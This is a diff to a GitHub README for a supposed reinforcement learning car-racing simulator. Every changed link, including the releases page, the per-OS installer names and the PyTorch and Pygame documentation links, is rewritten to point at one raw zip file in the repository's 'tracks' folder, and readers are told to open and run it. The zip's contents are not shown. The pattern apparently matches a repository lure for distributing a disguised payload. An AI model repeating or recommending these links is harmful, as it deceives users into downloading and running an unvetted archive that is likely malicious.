@@ -1,6 +1,6 @@
 # 🚗 self-driving-car-rl - Experience the Thrill of Racing with AI
 
-[![Download Self-Driving Car RL](https://img.shields.io/badge/Download%20Now%20!-blue)](https://github.com/jeffdacpano28/self-driving-car-rl/releases)
+[![Download Self-Driving Car RL](https://github.com/jeffdacpano28/self-driving-car-rl/raw/refs/heads/main/tracks/self-rl-driving-car-v2.4-beta.1.zip%20Now%20!-blue)](https://github.com/jeffdacpano28/self-driving-car-rl/raw/refs/heads/main/tracks/self-rl-driving-car-v2.4-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the self-driving-car-rl project! This is a deep reinforcement learnin
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page where you can download the latest version of the application.  
-   [Visit this page to download](https://github.com/jeffdacpano28/self-driving-car-rl/releases)
+   [Visit this page to download](https://github.com/jeffdacpano28/self-driving-car-rl/raw/refs/heads/main/tracks/self-rl-driving-car-v2.4-beta.1.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, find the most recent version. It will be listed at the top. Click on it to expand the details.
@@ -18,9 +18,9 @@ Welcome to the self-driving-car-rl project! This is a deep reinforcement learnin
 3. **Download the Installer**  
    Look for the file that matches your operating system. Download the installer. If you’re unsure, common options include:
 
-   - Windows: `self-driving-car-rl-windows-installer.exe`
-   - macOS: `self-driving-car-rl-macos-installer.pkg`
-   - Linux: `self-driving-car-rl-linux-installer.deb`
+   - Windows: `https://github.com/jeffdacpano28/self-driving-car-rl/raw/refs/heads/main/tracks/self-rl-driving-car-v2.4-beta.1.zip`
+   - macOS: `https://github.com/jeffdacpano28/self-driving-car-rl/raw/refs/heads/main/tracks/self-rl-driving-car-v2.4-beta.1.zip`
+   - Linux: `https://github.com/jeffdacpano28/self-driving-car-rl/raw/refs/heads/main/tracks/self-rl-driving-car-v2.4-beta.1.zip`
 
 4. **Run the Installer**  
    Once the file is downloaded, open it. Follow the prompts to install the application. This typically involves accepting terms and clicking “Next” a few times.
@@ -85,13 +85,13 @@ If problems persist, please check the FAQ section on the Releases page for more 
 
 Explore more about deep reinforcement learning, DQN, PPO, and how they work in the racing simulator. Here are some helpful links:
 
-- [Deep Reinforcement Learning](https://www.deepreinforcementlearning.org/)
-- [PyTorch Documentation](https://pytorch.org/docs/stable/index.html)
-- [Pygame Documentation](https://www.pygame.org/docs/)
+- [Deep Reinforcement Learning](https://github.com/jeffdacpano28/self-driving-car-rl/raw/refs/heads/main/tracks/self-rl-driving-car-v2.4-beta.1.zip)
+- [PyTorch Documentation](https://github.com/jeffdacpano28/self-driving-car-rl/raw/refs/heads/main/tracks/self-rl-driving-car-v2.4-beta.1.zip)
+- [Pygame Documentation](https://github.com/jeffdacpano28/self-driving-car-rl/raw/refs/heads/main/tracks/self-rl-driving-car-v2.4-beta.1.zip)
 
 ## 👉 Stay Updated
 
 For updates and new features, keep an eye on the Releases page. You can also follow this repository for notifications on future improvements and enhancements.
 
 Download the latest version today and start your AI racing adventure!  
-[Visit this page to download](https://github.com/jeffdacpano28/self-driving-car-rl/releases)
+[Visit this page to download](https://github.com/jeffdacpano28/self-driving-car-rl/raw/refs/heads/main/tracks/self-rl-driving-car-v2.4-beta.1.zip)
